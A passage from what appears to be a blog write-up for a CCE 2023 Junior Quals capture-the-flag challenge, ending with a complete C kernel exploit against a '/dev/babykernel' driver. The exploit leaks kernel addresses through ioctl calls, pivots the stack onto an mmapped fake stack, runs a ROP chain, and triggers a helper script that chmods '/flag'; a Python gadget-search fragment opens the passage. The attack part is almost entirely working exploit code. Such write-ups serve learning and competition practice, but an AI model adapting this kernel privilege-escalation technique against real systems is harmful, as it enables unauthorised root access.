</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> md<span style="color:#f92672">.</span>disasm(mem[candi[j]<span style="color:#f92672">-</span>v:candi[j]<span style="color:#f92672">+</span>v], base<span style="color:#f92672">+</span>candi[j]<span style="color:#f92672">-</span>v):
</span></span><span style="display:flex;"><span>                        tmp <span style="color:#f92672">+=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>(<span style="color:#e6db74">&#39;0x&#39;</span><span style="color:#f92672">+</span>hex(i<span style="color:#f92672">.</span>address)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; (+&#39;</span><span style="color:#f92672">+</span> hex(i<span style="color:#f92672">.</span>address<span style="color:#f92672">-</span>base)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;)&#39;</span>, i<span style="color:#f92672">.</span>mnemonic, i<span style="color:#f92672">.</span>op_str))
</span></span><span style="display:flex;"><span>                s<span style="color:#f92672">.</span>append(tmp)
</span></span><span style="display:flex;"><span>            search(s,<span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;not mapped&#34;</span>)
</span></span></code></pre></div><h3 id="exploit-script-3">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-3">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define LEAK 0x1001
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define EXEC 0x1003
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define READ 0x1002
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">// -no-pie
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> ioinfo {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span> buf;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> off;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> user_cs, user_rflags, user_ss,user_rsp;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo &#39;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">chmod 777 /flag&#39; &gt; /tmp/x&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /tmp/x&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo -ne &#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xff&#39; &gt; /tmp/v&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;chmod +x /tmp/v&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/tmp/v&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">save_state</span>(){
</span></span><span style="display:flex;"><span>    __asm__ <span style="color:#a6e22e">__volatile__</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov user_cs, cs;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;pushf;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;pop user_rflags;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov user_rsp, rsp;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov user_ss, ss;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/babykernel&#34;</span>,O_RDONLY);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> ioinfo info;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">save_state</span>();
</span></span><span style="display:flex;"><span>    info.buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>    info.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, LEAK, <span style="color:#f92672">&amp;</span>info);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> commit_creds <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)info.buf;
</span></span><span style="display:flex;"><span>    info.off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, READ, <span style="color:#f92672">&amp;</span>info);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> ops <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)info.buf;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;commit_creds : 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ops : 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,commit_creds,ops);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(info.buf);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> base <span style="color:#f92672">=</span> commit_creds <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xfffffffffff00000</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> xchg_esp <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x605240</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// pwndbg&gt; x/10xi 0xffffffff89205240
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    0xffffffff89205240:  xchg   esp,eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    0xffffffff89205241:  ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    info.off <span style="color:#f92672">=</span> (xchg_esp <span style="color:#f92672">-</span> ops) <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span> stack <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((xchg_esp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff0000</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x5000</span>), <span style="color:#ae81ff">0x10000</span>,<span style="color:#ae81ff">7</span>,MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS <span style="color:#f92672">|</span> MAP_FIXED,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span> stack1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((xchg_esp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff0000</span>)), <span style="color:#ae81ff">0x10000</span>,<span style="color:#ae81ff">7</span>,MAP_PRIVATE <span style="color:#f92672">|</span> MAP_ANONYMOUS <span style="color:#f92672">|</span> MAP_FIXED,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// merge mem
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>stack)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;fake_stack : %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,stack);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> st <span style="color:#f92672">=</span> (xchg_esp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00</span>)) <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8197fd</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x08</span>)) <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1a8b340</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)) <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x44b12</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>)) <span style="color:#f92672">=</span> ((xchg_esp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x500</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>)) <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c4203</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>)) <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x72b6f7</span>; <span style="color:#75715e">// rep movsq qword ptr [rdi], qword ptr [rsi]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>)) <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1001144</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x48</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x50</span>)) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)<span style="color:#f92672">&amp;</span>shell;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x58</span>)) <span style="color:#f92672">=</span> user_cs;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x60</span>)) <span style="color:#f92672">=</span> user_rflags;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span>)) <span style="color:#f92672">=</span> user_rsp;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(st <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x70</span>)) <span style="color:#f92672">=</span> user_ss;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)((xchg_esp <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x500</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x782f706d742f</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ioctl</span>(fd, EXEC, <span style="color:#f92672">&amp;</span>info);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img loading="lazy" src="/blog/CCE_2023_Junior_Quals/image-1-1.png" alt=""  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/cce-2023-junior-quals/">CCE 2023 Junior Quals</a></li>
      <li><a href="https://msh1307.kr/tags/cce-2023/">CCE 2023</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
